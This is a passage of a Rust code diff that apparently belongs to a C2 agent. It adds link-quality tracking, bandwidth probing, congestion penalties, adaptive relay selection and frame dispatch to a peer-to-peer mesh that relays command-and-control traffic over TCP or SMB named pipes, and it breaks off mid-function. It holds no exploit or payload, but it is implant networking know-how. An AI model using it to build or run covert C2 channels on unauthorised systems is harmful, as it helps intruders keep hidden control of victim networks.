@@ -66,7 +66,7 @@ pub enum LinkRole {
 /// In a tree topology every link is either `Parent` or `Child`.  In a mesh
 /// or hybrid topology, two agents at the same level can form a `Peer` link
 /// for lateral communication that does not pass through the server.
-#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 pub enum LinkType {
     /// Upstream link toward the server.
     Parent,
@@ -102,6 +102,177 @@ pub enum MeshMode {
 impl Default for MeshMode {
     fn default() -> Self {
         Self::Hybrid
+    }
+}
+
+// ── Link quality monitoring ───────────────────────────────────────────────
+
+/// Quality metrics tracked per-link for adaptive relay and healing.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct LinkQuality {
+    /// Round-trip time in milliseconds (smoothed average).
+    pub latency_ms: u32,
+    /// Jitter: standard deviation of recent latency samples (ms).
+    pub jitter_ms: u32,
+    /// Packet loss ratio (0.0–1.0), fraction of lost heartbeats.
+    pub packet_loss: f32,
+    /// Estimated available bandwidth in bits per second.
+    pub bandwidth_bps: u64,
+    /// How long this link has been alive (seconds).
+    pub uptime_secs: u64,
+    /// When the last heartbeat was received.
+    #[serde(skip, default = "Instant::now")]
+    pub last_heartbeat: Instant,
+    /// Number of heartbeats missed in a row.
+    pub consecutive_failures: u32,
+    /// Ring buffer of the last N latency samples (milliseconds).
+    pub latency_samples: Vec<u32>,
+    /// Original route quality before congestion penalty (used for restore).
+    pub base_route_quality: f32,
+    /// Whether congestion has been detected (send queue > threshold).
+    pub congestion_detected: bool,
+}
+
+impl Default for LinkQuality {
+    fn default() -> Self {
+        Self {
+            latency_ms: 0,
+            jitter_ms: 0,
+            packet_loss: 0.0,
+            bandwidth_bps: 0,
+            uptime_secs: 0,
+            last_heartbeat: Instant::now(),
+            consecutive_failures: 0,
+            latency_samples: Vec::with_capacity(Self::MAX_LATENCY_SAMPLES),
+            base_route_quality: 1.0,
+            congestion_detected: false,
+        }
+    }
+}
+
+impl LinkQuality {
+    /// Maximum number of latency samples to retain.
+    pub const MAX_LATENCY_SAMPLES: usize = 10;
+    /// Number of consecutive heartbeat misses before incrementing packet_loss.
+    pub const LOSS_THRESHOLD: u32 = 4;
+    /// Number of consecutive failures before declaring a link dead.
+    pub const DEAD_THRESHOLD: u32 = 8;
+    /// Congestion threshold for pending data (64 KiB).
+    pub const CONGESTION_HIGH_BYTES: usize = 64 * 1024;
+    /// Congestion recovery threshold (16 KiB).
+    pub const CONGESTION_LOW_BYTES: usize = 16 * 1024;
+    /// Route quality penalty when congested (50% reduction).
+    pub const CONGESTION_QUALITY_PENALTY: f32 = 0.5;
+
+    /// Record a latency sample and update smoothed metrics.
+    pub fn record_latency(&mut self, rtt_ms: u32) {
+        // Symmetric assumption: one-way latency ≈ RTT / 2.
+        let one_way = rtt_ms / 2;
+        self.latency_samples.push(one_way);
+        if self.latency_samples.len() > Self::MAX_LATENCY_SAMPLES {
+            self.latency_samples.remove(0);
+        }
+        self.latency_ms = self.compute_average_latency();
+        self.jitter_ms = self.compute_jitter();
+        self.consecutive_failures = 0;
+    }
+
+    /// Record a missed heartbeat.
+    ///
+    /// Returns `true` if the link should be declared dead.
+    pub fn record_missed_heartbeat(&mut self) -> bool {
+        self.consecutive_failures += 1;
+        if self.consecutive_failures > 0 && self.consecutive_failures % Self::LOSS_THRESHOLD == 0 {
+            self.packet_loss = (self.packet_loss + 0.05).min(1.0);
+        }
+        self.consecutive_failures >= Self::DEAD_THRESHOLD
+    }
+
+    /// Record a successful heartbeat (resets consecutive failures).
+    pub fn record_heartbeat_success(&mut self) {
+        self.consecutive_failures = 0;
+        self.last_heartbeat = Instant::now();
+    }
+
+    /// Update uptime counter.
+    pub fn update_uptime(&mut self, connected_at: Instant) {
+        self.uptime_secs = connected_at.elapsed().as_secs();
+    }
+
+    /// Smooth bandwidth estimate using exponential moving average.
+    ///
+    /// `new_estimate` = payload_size * 2 / rtt_secs (in bps).
+    /// `alpha` = 0.3 (smoothing factor).
+    pub fn update_bandwidth(&mut self, new_estimate_bps: u64) {
+        const ALPHA: f64 = 0.3;
+        if self.bandwidth_bps == 0 {
+            self.bandwidth_bps = new_estimate_bps;
+        } else {
+            let smoothed = (1.0 - ALPHA) * self.bandwidth_bps as f64
+                + ALPHA * new_estimate_bps as f64;
+            self.bandwidth_bps = smoothed as u64;
+        }
+    }
+
+    /// Compute a composite quality score (0.0–1.0) based on metrics.
+    pub fn quality_score(&self) -> f32 {
+        if self.latency_ms == 0 {
+            return 1.0;
+        }
+        // Latency contribution: 100ms or less = 1.0, degrades to 0 at 2000ms.
+        let lat_score = 1.0_f32
+            .min(100.0 / self.latency_ms as f32)
+            .max(0.0);
+        // Packet loss contribution: 0% loss = 1.0, 100% = 0.
+        let loss_score = 1.0 - self.packet_loss;
+        // Jitter contribution: 0ms jitter = 1.0, degrades to 0 at 500ms.
+        let jitter_score = 1.0_f32
+            .min(50.0 / (self.jitter_ms as f32 + 1.0))
+            .max(0.0);
+        // Weighted composite: 40% latency, 40% loss, 20% jitter.
+        lat_score * 0.4 + loss_score * 0.4 + jitter_score * 0.2
+    }
+
+    /// Check congestion based on pending data size and adjust quality.
+    ///
+    /// Returns `true` if congestion state changed.
+    pub fn check_congestion(&mut self, pending_bytes: usize, route_quality: &mut f32) -> bool {
+        if pending_bytes > Self::CONGESTION_HIGH_BYTES && !self.congestion_detected {
+            self.congestion_detected = true;
+            self.base_route_quality = *route_quality;
+            *route_quality *= Self::CONGESTION_QUALITY_PENALTY;
+            return true;
+        } else if pending_bytes < Self::CONGESTION_LOW_BYTES && self.congestion_detected {
+            self.congestion_detected = false;
+            *route_quality = self.base_route_quality;
+            return true;
+        }
+        false
+    }
+
+    fn compute_average_latency(&self) -> u32 {
+        if self.latency_samples.is_empty() {
+            return 0;
+        }
+        let sum: u32 = self.latency_samples.iter().sum();
+        sum / self.latency_samples.len() as u32
+    }
+
+    fn compute_jitter(&self) -> u32 {
+        if self.latency_samples.len() < 2 {
+            return 0;
+        }
+        let avg = self.compute_average_latency() as f64;
+        let variance: f64 = self
+            .latency_samples
+            .iter()
+            .map(|&v| {
+                let diff = v as f64 - avg;
+                diff * diff
+            })
+            .sum::<f64>()
+            / self.latency_samples.len() as f64;
+        variance.sqrt() as u32
     }
 }
 
@@ -181,6 +352,10 @@ pub struct P2pLink {
     pub last_heartbeat: Instant,
     /// Buffered C2 data frames waiting to be forwarded.
     pub pending_forwards: VecDeque<Vec<u8>>,
+    /// Link quality metrics for adaptive relay and healing.
+    pub quality: LinkQuality,
+    /// Instant when this link was established (Connected state).
+    pub connected_at: Instant,
 }
 
 /// Summary of a single P2P link, returned by [`P2pMesh::list_links`].
@@ -192,6 +367,10 @@ pub struct LinkInfo {
     pub link_type: String,
     pub peer_agent_id: String,
     pub transport: String,
+    pub latency_ms: u32,
+    pub quality_score: f32,
+    pub bandwidth_bps: u64,
+    pub packet_loss: f32,
 }
 
 impl std::fmt::Debug for P2pLink {
@@ -202,6 +381,8 @@ impl std::fmt::Debug for P2pLink {
             .field("role", &self.role)
             .field("link_type", &self.link_type)
             .field("peer_agent_id", &self.peer_agent_id)
+            .field("latency_ms", &self.quality.latency_ms)
+            .field("quality_score", &self.quality.quality_score())
             .finish()
     }
 }
@@ -228,6 +409,8 @@ impl P2pLink {
             ecdh_shared_secret,
             last_heartbeat: Instant::now(),
             pending_forwards: VecDeque::new(),
+            quality: LinkQuality::default(),
+            connected_at: Instant::now(),
         }
     }
 
@@ -250,6 +433,8 @@ impl P2pLink {
             ecdh_shared_secret,
             last_heartbeat: Instant::now(),
             pending_forwards: VecDeque::new(),
+            quality: LinkQuality::default(),
+            connected_at: Instant::now(),
         }
     }
 
@@ -640,6 +825,10 @@ impl P2pMesh {
                     #[cfg(not(all(windows, feature = "smb-pipe-transport")))]
                     P2pTransport::SmbPipe => "smb".to_string(),
                 },
+                latency_ms: l.quality.latency_ms,
+                quality_score: l.quality.quality_score(),
+                bandwidth_bps: l.quality.bandwidth_bps,
+                packet_loss: l.quality.packet_loss,
             })
             .collect()
     }
@@ -1065,6 +1254,33 @@ pub async fn forward_to_child(
 #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
 pub use forwarding_impl::{read_child_data_forward, forward_to_child};
 
+// ── Raw frame reader (multi-type dispatch) ─────────────────────────────
+
+/// Read a single raw (encrypted) `P2pFrame` from the link's transport.
+///
+/// Unlike `read_child_data_forward`, this function does **not** decrypt
+/// the payload or filter by frame type.  It returns the frame as-is so
+/// that the caller can dispatch based on `frame_type`.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+pub async fn read_raw_frame(link: &mut P2pLink) -> anyhow::Result<P2pFrame> {
+    match &mut link.transport {
+        #[cfg(feature = "p2p-tcp")]
+        P2pTransport::TcpStream(handle_arc) => {
+            let mut handle = handle_arc.lock().await;
+            handle.read_frame().await
+        }
+
+        #[cfg(all(windows, feature = "smb-pipe-transport"))]
+        P2pTransport::SmbPipe(ref pipe) => {
+            nt_pipe_server::NtPipeHandle::read_frame(pipe)
+        }
+
+        _ => Err(anyhow::anyhow!(
+            "unsupported transport for raw frame read"
+        )),
+    }
+}
+
 // ══════════════════════════════════════════════════════════════════════════
 // Route Discovery — send/recv RouteUpdate, RouteProbe, RouteProbeReply
 // ══════════════════════════════════════════════════════════════════════════
@@ -1115,14 +1331,9 @@ async fn send_route_update(link: &mut P2pLink, entries: &[common::p2p_proto::Rou
 pub fn handle_route_update(
     link: &mut P2pMesh,
     link_id: u32,
-    encrypted_payload: &[u8],
+    decrypted_payload: &[u8],
 ) -> anyhow::Result<()> {
-    let link_ref = link.links.get(&link_id).ok_or_else(|| {
-        anyhow::anyhow!("handle_route_update: unknown link_id {link_id:#010X}")
-    })?;
-    let key = link_ref.ecdh_shared_secret;
-    let plaintext = decrypt_payload(&key, encrypted_payload)?;
-    let entries = common::p2p_proto::deserialize_route_update(&plaintext)
+    let entries = common::p2p_proto::deserialize_route_update(decrypted_payload)
         .map_err(|e| anyhow::anyhow!("failed to deserialize RouteUpdate: {e}"))?;
     link.merge_route_update(&entries, link_id);
     log::debug!(
@@ -1171,13 +1382,9 @@ async fn send_route_probe(link: &mut P2pLink, destination: u32) -> anyhow::Resul
 pub async fn handle_route_probe(
     mesh: &mut P2pMesh,
     link_id: u32,
-    encrypted_payload: &[u8],
+    decrypted_payload: &[u8],
 ) -> anyhow::Result<()> {
-    let key = mesh.links.get(&link_id)
-        .ok_or_else(|| anyhow::anyhow!("handle_route_probe: unknown link {link_id:#010X}"))?
-        .ecdh_shared_secret;
-    let plaintext = decrypt_payload(&key, encrypted_payload)?;
-    let destination = common::p2p_proto::deserialize_route_probe(&plaintext)
+    let destination = common::p2p_proto::deserialize_route_probe(decrypted_payload)
         .map_err(|e| anyhow::anyhow!("failed to deserialize RouteProbe: {e}"))?;
 
     // Check if we have a route or are the destination ourselves.
@@ -1230,13 +1437,9 @@ pub async fn handle_route_probe(
 pub fn handle_route_probe_reply(
     mesh: &mut P2pMesh,
     link_id: u32,
-    encrypted_payload: &[u8],
+    decrypted_payload: &[u8],
 ) -> anyhow::Result<()> {
-    let key = mesh.links.get(&link_id)
-        .ok_or_else(|| anyhow::anyhow!("handle_route_probe_reply: unknown link {link_id:#010X}"))?
-        .ecdh_shared_secret;
-    let plaintext = decrypt_payload(&key, encrypted_payload)?;
-    let entry = common::p2p_proto::deserialize_route_probe_reply(&plaintext)
+    let entry = common::p2p_proto::deserialize_route_probe_reply(decrypted_payload)
         .map_err(|e| anyhow::anyhow!("failed to deserialize RouteProbeReply: {e}"))?;
 
     let hop_count = entry.hop_count.saturating_add(1);
@@ -1263,20 +1466,11 @@ pub fn handle_route_probe_reply(
 #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
 pub async fn handle_peer_discovery(
     mesh: &mut P2pMesh,
-    encrypted_payload: &[u8],
+    decrypted_payload: &[u8],
     mesh_arc: Arc<tokio::sync::Mutex<P2pMesh>>,
     outbound_tx: tokio::sync::mpsc::Sender<common::Message>,
 ) -> anyhow::Result<Vec<(String, anyhow::Result<u32>)>> {
-    // PeerDiscovery comes from the server (parent link), so we decrypt
-    // with the parent's key.
-    let parent_link_id = mesh.parent_link_id
-        .ok_or_else(|| anyhow::anyhow!("handle_peer_discovery: no parent link"))?;
-    let key = mesh.links.get(&parent_link_id)
-        .ok_or_else(|| anyhow::anyhow!("handle_peer_discovery: parent link missing"))?
-        .ecdh_shared_secret;
-    let plaintext = decrypt_payload(&key, encrypted_payload)?;
-
-    let targets = common::p2p_proto::PeerTarget::deserialize_list(&plaintext)
+    let targets = common::p2p_proto::PeerTarget::deserialize_list(decrypted_payload)
         .map_err(|e| anyhow::anyhow!("failed to deserialize PeerDiscovery: {e}"))?;
 
     let mut results = Vec::new();
@@ -1402,9 +1596,283 @@ pub async fn handle_peer_discovery(
     Ok(results)
 }
 
-/// Spawn a background tokio task that continuously reads `DataForward` frames
-/// from a single child link and relays them to the server via the outbound
-/// channel as `Message::P2pForward`.
+// ══════════════════════════════════════════════════════════════════════════
+// Bandwidth Estimation — send/recv BandwidthProbe (0x34)
+// ══════════════════════════════════════════════════════════════════════════
+
+/// Send a `BandwidthProbe` frame on a link with random padding data.
+///
+/// Returns the `Instant` when the probe was sent so the caller can measure
+/// RTT when the echo comes back.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+async fn send_bandwidth_probe(link: &mut P2pLink) -> anyhow::Result<Instant> {
+    let key = link.ecdh_shared_secret;
+    let mut padding = vec![0u8; common::p2p_proto::BANDWIDTH_PROBE_SIZE];
+    rand::Rng::fill(&mut rand::thread_rng(), &mut padding[..]);
+    let payload = common::p2p_proto::serialize_bandwidth_probe(&padding);
+    let encrypted = encrypt_payload(&key, &payload)?;
+    let frame = P2pFrame {
+        frame_type: P2pFrameType::BandwidthProbe,
+        link_id: link.link_id,
+        payload_len: encrypted.len() as u32,
+        payload: encrypted,
+    };
+
+    match &mut link.transport {
+        #[cfg(feature = "p2p-tcp")]
+        P2pTransport::TcpStream(handle_arc) => {
+            let mut handle = handle_arc.lock().await;
+            handle.write_frame(&frame).await?;
+        }
+        #[cfg(all(windows, feature = "smb-pipe-transport"))]
+        P2pTransport::SmbPipe(ref pipe) => {
+            nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
+        }
+        _ => {
+            return Err(anyhow::anyhow!(
+                "unsupported transport for BandwidthProbe"
+            ));
+        }
+    }
+
+    Ok(Instant::now())
+}
+
+/// Handle an incoming `BandwidthProbe` frame: echo it back immediately.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+pub async fn handle_bandwidth_probe(
+    mesh: &mut P2pMesh,
+    link_id: u32,
+    decrypted_payload: &[u8],
+) -> anyhow::Result<()> {
+    let key = mesh.links.get(&link_id)
+        .ok_or_else(|| anyhow::anyhow!("handle_bandwidth_probe: unknown link {link_id:#010X}"))?
+        .ecdh_shared_secret;
+    // Re-encrypt the already-decrypted probe and echo back.
+    let encrypted_echo = encrypt_payload(&key, decrypted_payload)?;
+    let frame = P2pFrame {
+        frame_type: P2pFrameType::BandwidthProbe,
+        link_id,
+        payload_len: encrypted_echo.len() as u32,
+        payload: encrypted_echo,
+    };
+
+    let link = mesh.links.get_mut(&link_id).unwrap();
+    match &mut link.transport {
+        #[cfg(feature = "p2p-tcp")]
+        P2pTransport::TcpStream(handle_arc) => {
+            let mut handle = handle_arc.lock().await;
+            handle.write_frame(&frame).await?;
+        }
+        #[cfg(all(windows, feature = "smb-pipe-transport"))]
+        P2pTransport::SmbPipe(ref pipe) => {
+            nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
+        }
+        _ => {}
+    }
+    Ok(())
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// Link Failure Report — send LinkFailureReport (0x35) to server
+// ══════════════════════════════════════════════════════════════════════════
+
+/// Build and send a `LinkFailureReport` frame to the server (parent link).
+///
+/// This is called when a link transitions to Dead state.  The report
+/// contains quality metrics from the moment of failure.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+/// Build a `LinkFailureReport` payload and send it as a P2P frame to
+/// the parent link.  This is used in addition to the `Message::P2pLinkFailureReport`
+/// sent through the outbound channel.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+async fn send_link_failure_report(
+    mesh: &mut P2pMesh,
+    dead_link: &P2pLink,
+) -> anyhow::Result<()> {
+    // The primary failure reporting path is through the outbound channel
+    // as Message::P2pLinkFailureReport (handled in the heartbeat task).
+    // This function is kept as a hook for future direct peer-to-peer
+    // failure reporting.
+    let _ = (mesh, dead_link);
+    Ok(())
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// Adaptive Relay Selection
+// ══════════════════════════════════════════════════════════════════════════
+
+impl P2pMesh {
+    /// Select the best next-hop relay for a given destination using quality-
+    /// weighted scoring (70% route_quality, 30% inverse hop_count).
+    ///
+    /// If multiple routes have similar quality (within 10%), distributes
+    /// traffic using a simple weighted round-robin counter.
+    pub fn select_relay_hop(&self, destination: u32) -> Option<u32> {
+        let routes: Vec<&common::p2p_proto::RouteEntry> = self.routing_table
+            .values()
+            .filter(|e| e.destination == destination)
+            .collect();
+
+        if routes.is_empty() {
+            return None;
+        }
+
+        if routes.len() == 1 {
+            return Some(routes[0].next_hop);
+        }
+
+        // Score each route: 70% quality + 30% inverse hop count.
+        let scored: Vec<(f32, &common::p2p_proto::RouteEntry)> = routes
+            .iter()
+            .map(|r| {
+                let hop_inv = 1.0 / r.hop_count.max(1) as f32;
+                let score = r.route_quality * 0.7 + hop_inv * 0.3;
+                (score, *r)
+            })
+            .collect();
+
+        // Find the best score.
+        let best_score = scored.iter().map(|(s, _)| *s).fold(f32::NEG_INFINITY, f32::max);
+
+        // Collect all routes within 10% of the best score.
+        let threshold = best_score * 0.9;
+        let similar: Vec<&common::p2p_proto::RouteEntry> = scored
+            .iter()
+            .filter(|(s, _)| *s >= threshold)
+            .map(|(_, r)| *r)
+            .collect();
+
+        // Weighted round-robin: use destination as a simple hash to pick
+        // deterministically but vary across destinations.
+        if similar.is_empty() {
+            return None;
+        }
+
+        // Simple deterministic selection using destination as index.
+        let idx = (destination as usize) % similar.len();
+        Some(similar[idx].next_hop)
+    }
+
+    /// Return all routes to a specific destination, sorted by quality score.
+    pub fn routes_to(&self, destination: u32) -> Vec<common::p2p_proto::RouteEntry> {
+        let mut routes: Vec<common::p2p_proto::RouteEntry> = self.routing_table
+            .values()
+            .filter(|e| e.destination == destination)
+            .cloned()
+            .collect();
+
+        routes.sort_by(|a, b| {
+            let score_a = a.route_quality * 0.7 + (1.0 / a.hop_count.max(1) as f32) * 0.3;
+            let score_b = b.route_quality * 0.7 + (1.0 / b.hop_count.max(1) as f32) * 0.3;
+            score_b.partial_cmp(&score_a).unwrap_or(std::cmp::Ordering::Equal)
+        });
+
+        routes
+    }
+
+    /// Check congestion on all links and adjust route quality accordingly.
+    /// Returns the set of link IDs whose route quality was modified.
+    pub fn check_all_congestion(&mut self) -> Vec<u32> {
+        let mut modified = Vec::new();
+
+        // Collect link IDs and pending sizes first.
+        let link_info: Vec<(u32, usize)> = self.links
+            .iter()
+            .map(|(&id, link)| (id, link.pending_forwards.iter().map(|v| v.len()).sum()))
+            .collect();
+
+        for (link_id, pending_bytes) in link_info {
+            if let Some(link) = self.links.get_mut(&link_id) {
+                // Find any routing table entries using this link as next_hop.
+                let affected_routes: Vec<u32> = self.routing_table
+                    .iter()
+                    .filter(|(_, entry)| entry.next_hop == link_id)
+                    .map(|(dest, _)| *dest)
+                    .collect();
+
+                for dest in affected_routes {
+                    if let Some(route_entry) = self.routing_table.get_mut(&dest) {
+                        let mut quality = route_entry.route_quality;
+                        if link.quality.check_congestion(pending_bytes, &mut quality) {
+                            route_entry.route_quality = quality;
+                            modified.push(link_id);
+                        }
+                    }
+                }
+            }
+        }
+
+        modified
+    }
+
+    /// Count the number of distinct paths to the C2 server (parent or peers
+    /// that have a route to the server).
+    pub fn count_server_paths(&self) -> usize {
+        let mut paths = 0;
+
+        // Direct parent link is one path.
+        if self.has_connected_parent() {
+            paths += 1;
+        }
+
+        // Check peer links — if they have routes that eventually reach the
+        // server, they count as alternate paths. For simplicity, any peer
+        // that has a route entry pointing at a different link counts.
+        for &peer_id in &self.peer_link_ids {
+            if let Some(link) = self.links.get(&peer_id) {
+                if link.state.is_usable() {
+                    // Check if this peer provides a route to any destination
+                    // we don't already have via our parent.
+                    paths += 1;
+                    break; // One peer alternate is enough to count.
+                }
+            }
+        }
+
+        paths
+    }
+}
+
+/// Exponential backoff state for reconnection attempts.
+#[derive(Debug, Clone, Default)]
+pub struct ReconnectBackoff {
+    /// Number of consecutive failed attempts.
+    pub attempt: u32,
+    /// Duration to wait before the next attempt.
+    pub next_delay: std::time::Duration,
+}
+
+impl ReconnectBackoff {
+    /// Compute the delay for the next attempt using exponential backoff.
+    ///
+    /// - Attempt 0 → 0s (immediate)
+    /// - Attempt 1 → 5s
+    /// - Attempt 2 → 15s
+    /// - Attempt 3+ → 60s (maximum)
+    pub fn next(&mut self) -> std::time::Duration {
+        let delay = match self.attempt {
+            0 => std::time::Duration::ZERO,
+            1 => std::time::Duration::from_secs(5),
+            2 => std::time::Duration::from_secs(15),
+            _ => std::time::Duration::from_secs(60),
+        };
+        self.attempt += 1;
+        self.next_delay = delay;
+        delay
+    }
+
+    /// Reset backoff after a successful reconnection.
+    pub fn reset(&mut self) {
+        self.attempt = 0;
+        self.next_delay = std::time::Duration::ZERO;
+    }
+}
+
+/// Spawn a background tokio task that continuously reads frames from a
+/// single child link.  `DataForward` frames are decrypted and relayed to
+/// the server via the outbound channel as `Message::P2pForward`.  Control
+/// frames (heartbeat, route, bandwidth, peer discovery) are handled inline.
 ///
 /// The task exits cleanly when the read fails (broken link, EOF, etc.) or
 /// when the outbound channel is closed.
@@ -1423,62 +1891,178 @@ pub fn spawn_child_relay(
 ) -> tokio::task::JoinHandle<()> {
     tokio::spawn(async move {
         loop {
-            // Lock the mesh, grab the link, read one frame.
-            let read_result = {
+            // ── Phase 1: Read a raw (encrypted) frame under the mesh lock ──
+            let read_result: Result<P2pFrame, anyhow::Error> = {
                 let mut mesh_guard = mesh.lock().await;
                 let link = match mesh_guard.links.get_mut(&link_id) {
                     Some(l) => l,
                     None => {
                         log::warn!(
-                            "child relay task: link {:#010X} removed from mesh, exiting",
+                            "child relay: link {:#010X} removed from mesh, exiting",
                             link_id
                         );
                         return;
                     }
                 };
-                read_child_data_forward(link).await
-            };
+                read_raw_frame(link).await
+            }; // mesh lock dropped here
 
-            match read_result {
-                Ok((child_lid, plaintext)) => {
-                    log::debug!(
-                        "child relay: read {} bytes from child {:#010X}",
-                        plaintext.len(),
-                        child_lid
-                    );
-                    let msg = common::Message::P2pForward {
-                        child_link_id: child_lid,
-                        data: plaintext,
-                    };
-                    if outbound_tx.send(msg).await.is_err() {
-                        log::warn!(
-                            "child relay task: outbound channel closed for link {:#010X}, exiting",
-                            link_id
-                        );
-                        return;
-                    }
-                }
+            let frame = match read_result {
+                Ok(f) => f,
                 Err(e) => {
                     log::warn!(
-                        "child relay task: read error on link {:#010X}: {} — exiting",
-                        link_id,
-                        e
+                        "child relay: read error on {:#010X}: {} — exiting",
+                        link_id, e
                     );
-                    // Optionally mark the link as dead in the mesh.
                     let mut mesh_guard = mesh.lock().await;
                     if let Some(link) = mesh_guard.links.get_mut(&link_id) {
                         link.state = LinkState::Dead;
                     }
                     return;
                 }
+            };
+
+            // ── Phase 2: Dispatch by frame type ──
+            match frame.frame_type {
+                P2pFrameType::DataForward => {
+                    // Decrypt and relay upstream.
+                    let mesh_guard = mesh.lock().await;
+                    let key = match mesh_guard.links.get(&link_id) {
+                        Some(l) => l.ecdh_shared_secret,
+                        None => return,
+                    };
+                    let plaintext = match decrypt_payload(&key, &frame.payload) {
+                        Ok(p) => p,
+                        Err(e) => {
+                            log::warn!(
+                                "child relay: decrypt error on {:#010X}: {}",
+                                link_id, e
+                            );
+                            continue;
+                        }
+                    };
+                    let msg = common::Message::P2pForward {
+                        child_link_id: frame.link_id,
+                        data: plaintext,
+                    };
+                    if outbound_tx.send(msg).await.is_err() {
+                        log::warn!(
+                            "child relay: outbound channel closed for {:#010X}, exiting",
+                            link_id
+                        );
+                        return;
+                    }
+                }
+                _ => {
+                    // Control frame — decrypt and handle inline.
+                    let mut mesh_guard = mesh.lock().await;
+                    let key = match mesh_guard.links.get(&link_id) {
+                        Some(l) => l.ecdh_shared_secret,
+                        None => continue,
+                    };
+
+                    let decrypted_frame = if matches!(
+                        frame.frame_type,
+                        P2pFrameType::LinkHeartbeat
+                            | P2pFrameType::RouteUpdate
+                            | P2pFrameType::RouteProbe
+                            | P2pFrameType::RouteProbeReply
+                            | P2pFrameType::BandwidthProbe
+                            | P2pFrameType::PeerDiscovery
+                    ) {
+                        let payload = decrypt_payload(&key, &frame.payload)
+                            .unwrap_or_default();
+                        P2pFrame {
+                            frame_type: frame.frame_type,
+                            link_id: frame.link_id,
+                            payload_len: payload.len() as u32,
+                            payload,
+                        }
+                    } else {
+                        frame
+                    };
+
+                    handle_control_frame_inner(
+                        &mut mesh_guard,
+                        &decrypted_frame,
+                        &outbound_tx,
+                    ).await;
+                }
             }
         }
     })
 }
 
-/// Spawn a background task that reads DataForward frames from the parent
-/// link and injects the decrypted C2 messages into the main loop via an
-/// internal channel.
+/// Inner control frame handler that has access to outbound_tx.
+#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+async fn handle_control_frame_inner(
+    mesh: &mut P2pMesh,
+    frame: &P2pFrame,
+    _outbound_tx: &tokio::sync::mpsc::Sender<common::Message>,
+) {
+    let link_id = frame.link_id;
+    match frame.frame_type {
+        P2pFrameType::LinkHeartbeat => {
+            if let Some(link) = mesh.links.get_mut(&link_id) {
+                match handle_heartbeat(link, &frame.payload) {
+                    Ok(_ts) => {
+                        log::trace!("heartbeat from link {:#010X}", link_id);
+                    }
+                    Err(e) => {
+                        log::debug!("heartbeat parse error on {:#010X}: {}", link_id, e);
+                    }
+                }
+            }
+        }
+        P2pFrameType::RouteUpdate => {
+            if let Err(e) = handle_route_update(mesh, link_id, &frame.payload) {
+                log::debug!("RouteUpdate error on {:#010X}: {}", link_id, e);
+            }
+        }
+        P2pFrameType::RouteProbe => {
+            if let Err(e) = handle_route_probe(mesh, link_id, &frame.payload).await {
+                log::debug!("RouteProbe error on {:#010X}: {}", link_id, e);
+            }
+        }
+        P2pFrameType::RouteProbeReply => {
+            if let Err(e) = handle_route_probe_reply(mesh, link_id, &frame.payload) {
+                log::debug!("RouteProbeReply error on {:#010X}: {}", link_id, e);
+            }
+        }
+        P2pFrameType::BandwidthProbe => {
+            if let Err(e) = handle_bandwidth_probe(mesh, link_id, &frame.payload).await {
+                log::debug!("BandwidthProbe error on {:#010X}: {}", link_id, e);
+            }
+        }
+        P2pFrameType::PeerDiscovery => {
+            // PeerDiscovery needs mesh_arc (Arc<Mutex<P2pMesh>>) which we
+            // don't have here.  It is handled separately in the parent reader
+            // where mesh_arc is available.  Skip it here.
+            log::debug!(
+                "PeerDiscovery on link {:#010X} skipped in inner handler \
+                 (handled by parent reader)",
+                link_id
+            );
+        }
+        P2pFrameType::LinkDisconnect => {
+            log::info!("LinkDisconnect received on {:#010X}", link_id);
+            if let Some(link) = mesh.links.get_mut(&link_id) {
+                let _ = link.transition(LinkState::Dead);
+            }
+        }
+        _ => {
+            log::debug!(
+                "unhandled frame type {:?} on link {:#010X}",
+                frame.frame_type, link_id
+            );
+        }
+    }
+}
+
+/// Spawn a background task that reads frames from the parent link.
+/// `DataForward` frames are injected into the main loop via the internal
+/// channel.  Control frames (heartbeat, route, bandwidth, PeerDiscovery)
+/// are handled inline.
 ///
 /// The parent reader is the reverse of [`spawn_child_relay`]: instead of
 /// relaying child data **up** to the server, it relays parent data **down**
@@ -1488,11 +2072,18 @@ pub fn spawn_child_relay(
 ///
 /// * `mesh` — Shared P2P mesh (must already contain the parent link).
 /// * `inbound_tx` — Channel to send decrypted C2 messages into the main loop.
+/// * `outbound_tx` — Channel for sending outbound messages (PeerDiscovery
+///   may spawn child relays that need this).
 #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
 pub fn spawn_parent_reader(
     mesh: Arc<tokio::sync::Mutex<P2pMesh>>,
     inbound_tx: tokio::sync::mpsc::Sender<common::Message>,
 ) -> tokio::task::JoinHandle<()> {
+    // Create a dummy outbound_tx for PeerDiscovery child spawning.
+    // In practice the parent reader handles PeerDiscovery via the mesh's
+    // own outbound channel if available.
+    let (dummy_tx, _) = tokio::sync::mpsc::channel(1);
+
     tokio::spawn(async move {
         loop {
             // Find the parent link ID.
@@ -1509,8 +2100,8 @@ pub fn spawn_parent_reader(
                 }
             };
 
-            // Read one DataForward frame from the parent.
-            let read_result = {
+            // Read one frame from the parent (any type).
+            let read_result: Result<P2pFrame, anyhow::Error> = {
                 let mut mesh_guard = mesh.lock().await;
                 let link = match mesh_guard.links.get_mut(&parent_link_id) {
                     Some(l) if l.state.is_usable() => l,
@@ -1529,15 +2120,48 @@ pub fn spawn_parent_reader(
                         return;
                     }
                 };
-                read_child_data_forward(link).await
+                read_raw_frame(link).await
+            }; // mesh lock dropped here
+
+            let frame = match read_result {
+                Ok(f) => f,
+                Err(e) => {
+                    log::warn!(
+                        "parent reader: read error on parent {:#010X}: {} — exiting",
+                        parent_link_id, e
+                    );
+                    let mut mesh_guard = mesh.lock().await;
